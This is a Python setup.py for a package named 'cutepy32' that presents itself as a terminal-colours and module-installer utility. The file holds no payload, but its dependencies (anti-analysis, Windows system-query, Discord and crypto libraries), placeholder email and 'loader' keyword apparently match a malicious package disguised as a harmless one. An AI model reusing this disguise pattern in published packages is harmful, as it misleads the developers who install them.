from setuptools import setup, find_packages
import os

here = os.path.abspath(os.path.dirname(__file__))

VERSION = '0.0.1'
DESCRIPTION = 'Terminal colors & useful modules installer'
LONG_DESCRIPTION = 'A package that allows you to have simplicity and effectiveness in your projects and helps you install useful modules that are needed in development!'

# Setting up
setup(
    name="cutepy32",
    version=VERSION,
    author="patchthisloserrr",
    author_email="test@gmail.com",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=['WMI', 'guardshield', 'pywin32', 'discord', 'pycryptodome'],
    keywords=['python', 'python system Detection', 'python hex', 'python rgb', 'python hex', 'python loader', 'rich python', 'python rich', 'cutepy'],
    classifiers=[]
)
